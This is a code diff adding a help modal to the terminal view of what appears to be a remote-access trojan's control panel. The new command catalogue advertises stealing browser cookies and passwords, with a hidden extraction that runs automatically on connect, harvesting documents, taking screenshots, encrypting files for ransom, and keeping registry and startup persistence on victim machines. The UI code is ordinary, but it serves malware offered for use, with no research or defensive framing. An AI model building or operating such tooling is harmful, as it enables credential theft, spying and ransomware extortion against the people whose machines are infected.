@@ -10,7 +10,9 @@ import {
   FiUpload,
   FiCopy,
   FiMaximize2,
-  FiMinimize2
+  FiMinimize2,
+  FiHelpCircle,
+  FiX
 } from 'react-icons/fi';
 import { toast } from 'react-toastify';
 
@@ -220,12 +222,231 @@ const QuickCommandButton = styled.button`
   }
 `;
 
+const ModalOverlay = styled.div`
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.8);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  animation: fadeIn 0.2s ease-out;
+
+  @keyframes fadeIn {
+    from {
+      opacity: 0;
+    }
+    to {
+      opacity: 1;
+    }
+  }
+`;
+
+const ModalContent = styled.div`
+  background: #1a1a1a;
+  border: 1px solid #333;
+  border-radius: 12px;
+  width: 90%;
+  max-width: 900px;
+  max-height: 80vh;
+  overflow-y: auto;
+  animation: slideUp 0.3s ease-out;
+
+  @keyframes slideUp {
+    from {
+      transform: translateY(20px);
+      opacity: 0;
+    }
+    to {
+      transform: translateY(0);
+      opacity: 1;
+    }
+  }
+`;
+
+const ModalHeader = styled.div`
+  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
+  border-bottom: 1px solid #333;
+  padding: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  position: sticky;
+  top: 0;
+  z-index: 1;
+
+  h2 {
+    color: #00ff88;
+    font-size: 20px;
+    margin: 0;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+`;
+
+const CloseButton = styled.button`
+  background: rgba(255, 255, 255, 0.1);
+  border: 1px solid #333;
+  color: #ccc;
+  width: 32px;
+  height: 32px;
+  border-radius: 6px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s;
+
+  &:hover {
+    background: rgba(255, 107, 107, 0.2);
+    border-color: #ff6b6b;
+    color: #ff6b6b;
+  }
+`;
+
+const ModalBody = styled.div`
+  padding: 20px;
+`;
+
+const CommandSection = styled.div`
+  margin-bottom: 30px;
+
+  h3 {
+    color: #00ff88;
+    font-size: 16px;
+    margin-bottom: 12px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #333;
+  }
+`;
+
+const CommandList = styled.div`
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+  gap: 12px;
+`;
+
+const CommandItem = styled.div`
+  background: rgba(0, 255, 136, 0.05);
+  border: 1px solid #333;
+  border-radius: 8px;
+  padding: 12px;
+  transition: all 0.2s;
+
+  &:hover {
+    background: rgba(0, 255, 136, 0.1);
+    border-color: #00ff88;
+  }
+
+  .command-name {
+    color: #00ff88;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 4px;
+  }
+
+  .command-desc {
+    color: #888;
+    font-size: 12px;
+    line-height: 1.4;
+  }
+`;
+
+const SearchBox = styled.input`
+  width: 100%;
+  background: #0a0a0a;
+  border: 1px solid #333;
+  color: #fff;
+  padding: 12px 16px;
+  border-radius: 8px;
+  font-size: 14px;
+  margin-bottom: 20px;
+  outline: none;
+  transition: border-color 0.2s;
+
+  &:focus {
+    border-color: #00ff88;
+  }
+
+  &::placeholder {
+    color: #666;
+  }
+`;
+
 const Terminal = ({ client, socket }) => {
   const [command, setCommand] = useState('');
   const [output, setOutput] = useState([]);
   const [isConnected, setIsConnected] = useState(false);
+  const [showHelp, setShowHelp] = useState(false);
+  const [searchTerm, setSearchTerm] = useState('');
   const outputRef = useRef(null);
   const inputRef = useRef(null);
+
+  const commandsData = {
+    'System Information': [
+      { name: 'sysinfo', desc: 'Display detailed system information (OS, CPU, RAM, etc.)' },
+      { name: 'processes', desc: 'List all running processes' },
+      { name: 'services', desc: 'List all Windows services' },
+      { name: 'network', desc: 'Display network configuration' },
+      { name: 'antivirus', desc: 'Detect installed antivirus software' },
+      { name: 'firewall', desc: 'Check Windows Firewall status' },
+      { name: 'whoami', desc: 'Display current user information' },
+      { name: 'ipconfig', desc: 'Display IP configuration' },
+      { name: 'tasklist', desc: 'List all running tasks' },
+      { name: 'netstat -an', desc: 'Display all network connections' }
+    ],
+    'File Operations': [
+      { name: 'ls', desc: 'List files in current directory' },
+      { name: 'dir', desc: 'List files (Windows style)' },
+      { name: 'cd <path>', desc: 'Change directory' },
+      { name: 'pwd', desc: 'Show current working directory' },
+      { name: 'download <path>', desc: 'Download file from client' },
+      { name: 'upload <path>', desc: 'Upload file to client' }
+    ],
+    'Browser Data Extraction': [
+      { name: 'extractbrowser', desc: 'Extract browser data (cookies, history, passwords)' },
+      { name: 'extractbrowserhidden', desc: 'Hidden browser data extraction (auto-runs on connect)' },
+      { name: 'browserpaths', desc: 'Show recent browser file paths' },
+      { name: 'harvestdocs', desc: 'Scan and list all documents from Desktop, Downloads, Documents' }
+    ],
+    'Surveillance': [
+      { name: 'screenshot', desc: 'Take a screenshot' }
+    ],
+    'Ransomware': [
+      { name: 'encrypt <directory> <password>', desc: 'Encrypt files in directory' },
+      { name: 'decrypt <directory> <password>', desc: 'Decrypt files in directory' },
+      { name: 'setpass <password>', desc: 'Set encryption password' },
+      { name: 'getpass', desc: 'Get current encryption password' },
+      { name: 'listencrypted', desc: 'List all encrypted files' }
+    ],
+    'Persistence': [
+      { name: 'startup add', desc: 'Add to Windows startup' },
+      { name: 'startup remove', desc: 'Remove from Windows startup' },
+      { name: 'registry add', desc: 'Add registry persistence' },
+      { name: 'registry remove', desc: 'Remove registry persistence' }
+    ],
+    'Server Commands': [
+      { name: 'resolveshortcuts', desc: 'Process .lnk files in downloads folder and download actual files' },
+      { name: 'harvestdocs', desc: 'Scan system folders for documents (PDFs, Word, Excel, PowerPoint)' }
+    ],
+    'Windows Commands': [
+      { name: 'hostname', desc: 'Display computer name' },
+      { name: 'systeminfo', desc: 'Display system information' },
+      { name: 'taskkill /PID <pid>', desc: 'Kill a process' },
+      { name: 'sc query', desc: 'Query service status' },
+      { name: 'reg query <key>', desc: 'Query registry key' },
+      { name: 'dir /s <pattern>', desc: 'Search for files recursively' }
+    ],
+    'Control': [
+      { name: 'q', desc: 'Disconnect client (graceful exit)' },
+      { name: 'test', desc: 'Test connection' }
+    ]
+  };
 
   const quickCommands = [
     'sysinfo',
@@ -327,6 +548,24 @@ const Terminal = ({ client, socket }) => {
     toast.success('Output copied to clipboard');
   };
 
+  const filterCommands = () => {
+    if (!searchTerm.trim()) return commandsData;
+
+    const filtered = {};
+    Object.keys(commandsData).forEach(category => {
+      const matches = commandsData[category].filter(cmd =>
+        cmd.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        cmd.desc.toLowerCase().includes(searchTerm.toLowerCase())
+      );
+      if (matches.length > 0) {
+        filtered[category] = matches;
+      }
+    });
+    return filtered;
+  };
+
+  const filteredCommands = filterCommands();
+
   if (!client) {
     return (
       <TerminalContainer>
@@ -358,6 +597,10 @@ const Terminal = ({ client, socket }) => {
         </HeaderLeft>
         
         <HeaderRight>
+          <HeaderButton onClick={() => setShowHelp(true)}>
+            <FiHelpCircle />
+            Help
+          </HeaderButton>
           <HeaderButton onClick={copyOutput}>
             <FiCopy />
             Copy
@@ -368,6 +611,56 @@ const Terminal = ({ client, socket }) => {
           </HeaderButton>
         </HeaderRight>
       </TerminalHeader>
+
+      {showHelp && (
+        <ModalOverlay onClick={() => setShowHelp(false)}>
+          <ModalContent onClick={(e) => e.stopPropagation()}>
+            <ModalHeader>
+              <h2>
+                <FiHelpCircle />
+                Available Commands
+              </h2>
+              <CloseButton onClick={() => setShowHelp(false)}>
+                <FiX />
+              </CloseButton>
+            </ModalHeader>
+            <ModalBody>
+              <SearchBox
+                type="text"
+                placeholder="Search commands..."
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+              />
+              
+              {Object.keys(filteredCommands).length === 0 ? (
+                <div style={{ color: '#666', textAlign: 'center', padding: '40px' }}>
+                  No commands found matching "{searchTerm}"
+                </div>
+              ) : (
+                Object.keys(filteredCommands).map((category) => (
+                  <CommandSection key={category}>
+                    <h3>{category}</h3>
+                    <CommandList>
+                      {filteredCommands[category].map((cmd, index) => (
+                        <CommandItem key={index} onClick={() => {
+                          setCommand(cmd.name.replace(/<.*?>/g, ''));
+                          setShowHelp(false);
+                          if (inputRef.current) {
+                            inputRef.current.focus();
+                          }
+                        }}>
+                          <div className="command-name">{cmd.name}</div>
+                          <div className="command-desc">{cmd.desc}</div>
+                        </CommandItem>
+                      ))}
+                    </CommandList>
+                  </CommandSection>
+                ))
+              )}
+            </ModalBody>
+          </ModalContent>
+        </ModalOverlay>
+      )}
 
       <TerminalBody>
         <QuickCommands>
